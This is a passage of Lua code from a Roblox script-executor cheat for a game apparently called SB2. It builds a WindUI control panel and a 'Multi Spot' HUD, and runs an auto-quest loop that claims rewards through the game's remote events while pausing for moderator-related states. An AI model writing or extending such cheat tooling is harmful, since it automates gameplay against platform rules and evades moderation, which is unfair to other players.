            AnchorPoint=Vector2.new(1,.5),ThemeTag={TextColor3="Text"},ZIndex=header.ZIndex+2},nil)
        button.Parent=header;bind(button.Activated,callback)
        return button
    end
    local function visible(show)
        if state.PerformanceBoost then state.PerformanceBoost.SetUIVisible(show)end
        showUI.Visible=state.Running==true
        roots(function(root)root.Enabled=show end)
    end
    local function loadLibrary()
        local chunk=assert(loadstring(librarySource,"Feather WindUI"))
        local nativeMake=makefolder
        local environment=setmetatable({gethui=function()return parent end,makefolder=function(path)
            if type(isfolder)=="function"and isfolder(path)then return end
            assert(type(nativeMake)=="function","Executor filesystem is unavailable")
            nativeMake(path)
        end},{__index=getfenv()})
        setfenv(chunk,environment)
        return chunk()
    end
    local ok,result=pcall(function()
        state.WindUIStartedAt=os.clock();library=loadLibrary();uiMemory=makeMemory(library.Creator)
        roots(function(root)root.DisplayOrder=gui.DisplayOrder+1 end)
        pcall(installFeather)
        local size=viewport()
        state.UI.ActiveTab=preference("ActiveTab",state.UI.ActiveTab or "Main")
        state.WindUIPosition=preference("WindUIPosition",nil)
        function state.SetAutoHideUI(on)state.AutoHideUI=on==true;state.SaveNow()end
        local controller=make({State=state,WindUI=library,Memory=uiMemory,PlaceId=game.PlaceId,Defer=task.defer,InputService=UserInputService,
            Size=UDim2.fromOffset(math.min(640,math.max(320,size.X-24)),math.min(520,math.max(280,size.Y-70))),
            MinSize=Vector2.new(300,240),SideBarWidth=size.X<500 and 110 or 155,
            Visibility=visible,MarkAutoHide=mark,AddWhitelistClear=clearButton,AddRoomDelete=roomDeleteButton,
            DestroyRoots=function()roots(function(root)root:Destroy()end)end,
            FriendPresent=function(name)
                if name==""then return false end
                local wanted=name:lower()
                for _,person in ipairs(Players:GetPlayers())do if person~=player and person.Name:lower()==wanted then return true end end
                return false
            end})
        state.WindUI=controller;state.WindUIMainReadySeconds=os.clock()-state.WindUIStartedAt
        state.UI.WindWindow=controller.Window;state.UI.WindControls=controller.Controls;state.SetUIVisible=controller.SetVisible
        local frame=controller.Window.UIElements and controller.Window.UIElements.Main
        if frame then positionWindow(frame,size)end
        controller.SetVisible(not state.AutoHideUI and not state.UIHidden)
        task.spawn(function()
            while state.Running and state.WindUI==controller do
                local painted,reason=pcall(controller.Update,os.clock())
                if not painted then state.WindUIError=tostring(reason)end
                task.wait(.25)
            end
        end)
    end)
    -- BEGIN MODERN UI FAILURE
    if not ok then
        local current=state.Running and env.SB2LoadToken==loadToken and runtimeOwner.Alive()
        if state.WindUI then pcall(state.WindUI.Destroy);state.WindUI=nil end
        if library and library.Window then pcall(function()library.Window:Destroy()end)end
        if uiMemory then pcall(uiMemory.Destroy)
        elseif library and library.Creator and library.Creator.DisconnectAll then pcall(library.Creator.DisconnectAll)end
        roots(function(root)root:Destroy()end)
        if current then
            state.WindUIError=tostring(result);state.SetUIVisible=retryVisibility
            for _,child in ipairs(parent:GetChildren())do
                if not before[child]and child:IsA("ScreenGui")and ownedNames[child.Name]then child:Destroy()end
            end
            showUI.Visible=true;state.UIHidden=true
            warn("[SB2 WindUI] Modern UI unavailable; use the feather button to reload: "..state.WindUIError)
        end
    end
    -- END MODERN UI FAILURE
end
end
initializeModernUI()
end
-- Compact overlay and independent background projections.
do
    local attach=(function()
-- BEGIN BUNDLED MULTI SPOT HUD
-- A passive HUD projection never owns world state or movement.
return function(ctx)
    local nextPaint=0
    local alive=true
    local api={}
    function api.Update(stamp)
        if not alive or stamp<nextPaint then return end
        nextPaint=stamp+.2
        local show=ctx.State.Running==true and ctx.State.MultiSpot==true
        ctx.Visible(show)
        if show then ctx.Text(ctx.State.MultiSpotStatus or "Starting arena rotation...")end
    end
    local subscription=ctx.Pulse:Connect(function()api.Update(ctx.Now())end)
    function api.Destroy()
        if not alive then return end
        alive=false
        subscription:Disconnect();subscription=nil
        ctx.Destroy()
    end
    api.Update(ctx.Now())
    return api
end

-- END BUNDLED MULTI SPOT HUD
    end)()
    local frame=create("Frame",{Name="MultiSpotHUD",Size=UDim2.fromOffset(280,70),Visible=false,
        Position=UDim2.fromScale(.5,.5),AnchorPoint=Vector2.new(.5,.5),Active=true,
        BackgroundColor3=Color3.fromRGB(42,42,44),BorderSizePixel=0},gui)
    corner(frame,14)
    create("UIStroke",{Color=Color3.new(1,1,1),Transparency=.92,Thickness=1},frame)
    local common={BackgroundTransparency=1,TextXAlignment=Enum.TextXAlignment.Left}
    local heading=table.clone(common)
    heading.Name="Heading";heading.Text="Multi Spot";heading.Position=UDim2.fromOffset(12,8)
    heading.Size=UDim2.new(1,-24,0,18);heading.Font=Enum.Font.GothamBold;heading.TextSize=12;heading.TextColor3=Color3.new(1,1,1)
    create("TextLabel",heading,frame)
    local description=table.clone(common)
    description.Name="Status";description.Text="";description.Position=UDim2.fromOffset(12,28)
    description.Size=UDim2.new(1,-24,0,34);description.Font=Enum.Font.Gotham;description.TextSize=11
    description.TextWrapped=true;description.TextColor3=Color3.fromRGB(161,161,170);description.TextYAlignment=Enum.TextYAlignment.Top
    local label=create("TextLabel",description,frame)
    local drag
    bind(frame.InputBegan,function(input)
        local kind=input.UserInputType
        if kind==Enum.UserInputType.Touch or kind==Enum.UserInputType.MouseButton1 then drag={Input=input,Start=input.Position,Position=frame.Position}end
    end)
    bind(UserInputService.InputChanged,function(input)
        if not drag or not frame.Visible then return end
        if input~=drag.Input and input.UserInputType~=Enum.UserInputType.MouseMovement then return end
        local delta=input.Position-drag.Start;local extent=gui.AbsoluteSize;local origin=drag.Position
        local x=origin.X.Scale*extent.X+origin.X.Offset+delta.X
        local y=origin.Y.Scale*extent.Y+origin.Y.Offset+delta.Y
        frame.Position=UDim2.fromOffset(math.clamp(x,140,math.max(140,extent.X-140)),math.clamp(y,35,math.max(35,extent.Y-35)))
    end)
    bind(UserInputService.InputEnded,function(input)
        if drag and (input==drag.Input or input.UserInputType==Enum.UserInputType.MouseButton1)then drag=nil end
    end)
    state.MultiSpotHUD=attach({State=state,Pulse=RunService.Heartbeat,Now=os.clock,
        Visible=function(value)if frame.Visible~=value then frame.Visible=value end end,
        Text=function(text)if label.Text~=text then label.Text=text end end,
        Destroy=function()drag=nil;frame:Destroy()end})
end
local function refreshSharedFloor()
    if not sharedSettings then return end
    local ok,id=pcall(sharedSettings.ReadSafeFloor)
    if not ok or not id or id==state.SharedSafeFloorId then return end
    if state.AccountProgression then
        state.SharedSafeFloorId=id
        if state.ProgressionRestore then state.ProgressionRestore.SafeFloorId=id end
    elseif state.AutomationCatalog and state.AutomationCatalog.FloorById[id]and state.IsAutomationFloorUnlocked(id)then state.SetSafeFloor(id)
    else
        state.SharedSafeFloorId=id;state.SafeModeStatus="Shared Safe floor is locked on this account"
        if state.RefreshAutomationUI then state.RefreshAutomationUI()end
    end
end
if sharedSettings then task.spawn(function()
    while state.Running do refreshSharedFloor();task.wait(1)end
end)end
do
    local factory=(function()
-- BEGIN BUNDLED AUTO QUEST
-- Completion membership is the lifetime of a claim receipt.
return function(ctx)
    local api={Claims=0}
    local receipts=setmetatable({}, {__mode="k"})
    local due=0
    function api.Update(now)
        if now<due or not ctx.Active() then return end
        due=now+.5
        local completed=ctx.Ready()
        local live={}
        for index=1,#completed do live[completed[index]]=true end
        for quest in pairs(receipts)do if not live[quest]then receipts[quest]=nil end end
        if ctx.Busy() then return end
        for index=1,#completed do
            local quest=completed[index]
            local receipt=receipts[quest]
            local retry=not receipt or (receipt.count<3 and now>=receipt.retry)
            if retry and ctx.Valid(quest) then
                local attempts=receipt and receipt.count+1 or 1
                receipts[quest]={count=attempts,retry=now+attempts*10}
                local sent,reason=pcall(ctx.Claim,quest)
                if sent then api.Claims=api.Claims+1 else api.Error=tostring(reason)end
                break
            end
        end
    end
    return api
end

-- END BUNDLED AUTO QUEST
    end)()
    local quests=require(services.UI.Quests)
    local function ownFolder()
        local profile=ReplicatedStorage.Profiles:FindFirstChild(player.Name)
        return profile and profile:FindFirstChild("Quests")
    end
    local function valid(object)
        local entry=quests.Active and quests.Active[object]
        return object.Parent==ownFolder()and entry and quests.ToClaim and quests.ToClaim[entry.Entry]==true
    end
    local worker=factory({Active=function()return state.Running end,
        Busy=function()return state.StopEverything or state.SafeModePanic or state.ModeratorBlocking or state.AutomationTeleporting or state.AutoTradeBusy end,
        Ready=function()
            local list={}
            for object in pairs(quests.Active or {})do if valid(object)then list[#list+1]=object end end
            table.sort(list,function(a,b)return a.Name<b.Name end)
            return list
        end,Valid=valid,Claim=function(object)ReplicatedStorage.Event:FireServer("SystemQuests",{"ClaimQuest",object})end})
    state.AutoQuest=worker
    task.spawn(function()
        while state.Running do
            local ok,reason=pcall(worker.Update,os.clock())
            if not ok then state.AutoQuestError=tostring(reason)end
            task.wait(.5)
        end
    end)
end
state.StartupComplete=true
]============]
return assert(loadstring(SB2_SOURCE, "SB2"))(SB2_SOURCE)
